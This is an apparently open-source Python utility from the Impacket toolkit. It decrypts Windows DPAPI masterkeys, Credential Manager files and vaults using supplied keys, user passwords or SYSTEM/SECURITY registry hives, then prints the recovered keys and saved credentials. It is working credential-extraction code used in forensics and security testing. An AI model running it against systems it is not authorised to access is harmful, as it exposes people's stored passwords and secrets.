#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Author:
#  Alberto Solino (@agsolino)
#
# Description:
#       Example for using the DPAPI/Vault structures to unlock Windows Secrets.
#
# Examples:
#
#   You can unlock masterkeys, credentials and vaults. For the three, you will specify the file name (using -file for
#   masterkeys and credentials, and -vpol and -vcrd for vaults).
#   If no other parameter is sent, the contents of these resource will be shown, with their encrypted data as well.
#   If you specify a -key blob (in the form of '0xabcdef...') that key will be used to decrypt the contents.
#   In the case of vaults, you might need to also provide the user's sid (and the user password will be asked).
#   For system secrets, instead of a password you will need to specify the system and security hives.
#
# References: All of the work done by these guys. I just adapted their work to my needs.
#       https://www.passcape.com/index.php?section=docsys&cmd=details&id=28
#       https://github.com/jordanbtucker/dpapick
#       https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials (and everything else Ben did )
#       http://blog.digital-forensics.it/2016/01/windows-revaulting.html
#       https://www.passcape.com/windows_password_recovery_vault_explorer
#       https://www.passcape.com/windows_password_recovery_dpapi_master_key
#
from __future__ import division
from __future__ import print_function

import argparse
import logging
import sys
from binascii import unhexlify, hexlify
from hashlib import pbkdf2_hmac

from Cryptodome.Cipher import AES
from Cryptodome.Hash import HMAC, SHA1, MD4

from impacket import version
from impacket.examples import logger
from impacket.examples.secretsdump import LocalOperations, LSASecrets
from impacket.structure import hexdump
from impacket.dpapi import DPAPI_SYSTEM, MasterKeyFile, MasterKey, CredHist, DomainKey, CredentialFile, DPAPI_BLOB, \
    CREDENTIAL_BLOB, VAULT_VCRD, VAULT_VPOL, VAULT_KNOWN_SCHEMAS, VAULT_VPOL_KEYS

class DPAPI:
    def __init__(self, options):
        self.options = options
        self.dpapiSystem = None
        pass

    def getDPAPI_SYSTEM(self,secretType, secret):
        if secret.startswith("DPAPI_SYSTEM:"):
            self.dpapiSystem = DPAPI_SYSTEM(unhexlify(secret[len('DPAPI_SYSTEM:'):]))
            self.dpapiSystem.dump()

    def getLSA(self):
        localOperations = LocalOperations(self.options.system)
        bootKey = localOperations.getBootKey()

        lsaSecrets = LSASecrets(self.options.security, bootKey, None, isRemote=False, history=False, perSecretCallback = self.getDPAPI_SYSTEM)

        lsaSecrets.dumpSecrets()

    def deriveKeysFromUser(self, sid, password):
        # Will generate two keys, one with SHA1 and another with MD4
        key1 = HMAC.new(SHA1.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
        key2 = HMAC.new(MD4.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
        # For Protected users
        tmpKey = pbkdf2_hmac('sha256', MD4.new(password.encode('utf-16le')).digest(), sid.encode('utf-16le'), 10000)
        tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
        key3 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]

        return key1, key2, key3

    def run(self):
        if self.options.action.upper() == 'MASTERKEY':
            fp = open(options.file, 'rb')
            data = fp.read()
            mkf= MasterKeyFile(data)
            mkf.dump()
            data = data[len(mkf):]

            if mkf['MasterKeyLen'] > 0:
                mk = MasterKey(data[:mkf['MasterKeyLen']])
                data = data[len(mk):]

            if mkf['BackupKeyLen'] > 0:
                bkmk = MasterKey(data[:mkf['BackupKeyLen']])
                data = data[len(bkmk):]

            if mkf['CredHistLen'] > 0:
                ch = CredHist(data[:mkf['CredHistLen']])
                data = data[len(ch):]

            if mkf['DomainKeyLen'] > 0:
                dk = DomainKey(data[:mkf['DomainKeyLen']])
                data = data[len(dk):]

            if self.options.system and self.options.security:
                # We have hives, let's try to decrypt with them
                self.getLSA()
                decryptedKey = mk.decrypt(self.dpapiSystem['UserKey'])
                if decryptedKey:
                    print('Decrypted key with UserKey')
                    print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
                    return
                decryptedKey = mk.decrypt(self.dpapiSystem['MachineKey'])
                if decryptedKey:
                    print('Decrypted key with MachineKey')
                    print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
                    return
                decryptedKey = bkmk.decrypt(self.dpapiSystem['UserKey'])
                if decryptedKey:
                    print('Decrypted Backup key with UserKey')
                    print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
                    return
                decryptedKey = bkmk.decrypt(self.dpapiSystem['MachineKey'])
                if decryptedKey:
                    print('Decrypted Backup key with MachineKey')
                    print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
                    return
            elif self.options.key:
                key = unhexlify(self.options.key[2:])
                decryptedKey = mk.decrypt(key)
                if decryptedKey:
                    print('Decrypted key with key provided')
                    print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
                    return

            elif self.options.sid and self.options.key is None:
                # Do we have a password?
                if self.options.password is None:
                    # Nope let's ask it
                    from getpass import getpass
                    password = getpass("Password:")
                else:
                    password = options.password
                key1, key2, key3 = self.deriveKeysFromUser(self.options.sid, password)

                # if mkf['flags'] & 4 ? SHA1 : MD4
                decryptedKey = mk.decrypt(key3)
                if decryptedKey:
                    print('Decrypted key with User Key (MD4 protected)')
                    print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
                    return

                decryptedKey = mk.decrypt(key2)
                if decryptedKey:
                    print('Decrypted key with User Key (MD4)')
                    print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
                    return

                decryptedKey = mk.decrypt(key1)
                if decryptedKey:
                    print('Decrypted key with User Key (SHA1)')
                    print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
                    return

                decryptedKey = bkmk.decrypt(key3)
                if decryptedKey:
                    print('Decrypted Backup key with User Key (MD4 protected)')
                    print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
                    return

                decryptedKey = bkmk.decrypt(key2)
                if decryptedKey:
                    print('Decrypted Backup key with User Key (MD4)')
                    print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
                    return

                decryptedKey = bkmk.decrypt(key1)
                if decryptedKey:
                    print('Decrypted Backup key with User Key (SHA1)')
                    print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
                    return

            else:
                # Just print key's data
                if mkf['MasterKeyLen'] > 0:
                    mk.dump()

                if mkf['BackupKeyLen'] > 0:
                    bkmk.dump()

                if mkf['CredHistLen'] > 0:
                    ch.dump()

                if mkf['DomainKeyLen'] > 0:
                    dk.dump()

        elif self.options.action.upper() == 'CREDENTIAL':
            fp = open(options.file, 'rb')
            data = fp.read()
            cred = CredentialFile(data)
            blob = DPAPI_BLOB(cred['Data'])

            if self.options.key is not None:
                key = unhexlify(self.options.key[2:])
                decrypted = blob.decrypt(key)
                if decrypted is not None:
                    creds = CREDENTIAL_BLOB(decrypted)
                    creds.dump()
                    return
            else:
                # Just print the data
                blob.dump()

        elif self.options.action.upper() == 'VAULT':
            if options.vcrd is None and options.vpol is None:
                print('You must specify either -vcrd or -vpol parameter. Type --help for more info')
                return
            if options.vcrd is not None:
                fp = open(options.vcrd, 'rb')
                data = fp.read()
                blob = VAULT_VCRD(data)

                if self.options.key is not None:
                    key = unhexlify(self.options.key[2:])

                    cleartext = None
                    for i, entry in enumerate(blob.attributesLen):
                        if entry > 28:
                            attribute = blob.attributes[i]
                            if 'IV' in attribute.fields and len(attribute['IV']) == 16:
                                cipher = AES.new(key, AES.MODE_CBC, iv=attribute['IV'])
                            else:
                                cipher = AES.new(key, AES.MODE_CBC)
                            cleartext = cipher.decrypt(attribute['Data'])

                    if cleartext is not None:
                        # Lookup schema Friendly Name and print if we find one
                        if blob['FriendlyName'].decode('utf-16le')[:-1] in VAULT_KNOWN_SCHEMAS:
                            # Found one. Cast it and print
                            vault = VAULT_KNOWN_SCHEMAS[blob['FriendlyName'].decode('utf-16le')[:-1]](cleartext)
                            vault.dump()
                        else:
                            # otherwise
                            hexdump(cleartext)
                        return
                else:
                    blob.dump()

            elif options.vpol is not None:
                fp = open(options.vpol, 'rb')
                data = fp.read()
                vpol = VAULT_VPOL(data)
                vpol.dump()

                if self.options.key is not None:
                    key = unhexlify(self.options.key[2:])
                    blob = vpol['Blob']
                    data = blob.decrypt(key)
                    if data is not None:
                        keys = VAULT_VPOL_KEYS(data)
                        keys.dump()
                        return

        print('Cannot decrypt (specify -key or -sid whenever applicable) ')


if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Nose")
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    subparsers = parser.add_subparsers(help='actions', dest='action')

    # A masterkey command
    masterkey = subparsers.add_parser('masterkey', help='masterkey related functions')
    masterkey.add_argument('-file', action='store', required=True, help='Master Key File to parse')
    masterkey.add_argument('-sid', action='store', help='SID of the user')
    masterkey.add_argument('-key', action='store', help='Specific key to use for decryption')
    masterkey.add_argument('-password', action='store', help='User\'s password. If you specified the SID and not the password it will be prompted')
    masterkey.add_argument('-system', action='store', help='SYSTEM hive to parse')
    masterkey.add_argument('-security', action='store', help='SECURITY hive to parse')

    # A credential command
    credential = subparsers.add_parser('credential', help='credential related functions')
    credential.add_argument('-file', action='store', required=True, help='Credential file')
    credential.add_argument('-key', action='store', required=False, help='Key used for decryption')

    # A vault command
    vault = subparsers.add_parser('vault', help='vault credential related functions')
    vault.add_argument('-vcrd', action='store', required=False, help='Vault Credential file')
    vault.add_argument('-vpol', action='store', required=False, help='Vault Policy file')
    vault.add_argument('-key', action='store', required=False, help='Master key used for decryption')

    options = parser.parse_args()

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)


    try:
        executer = DPAPI(options)
        executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print(str(e))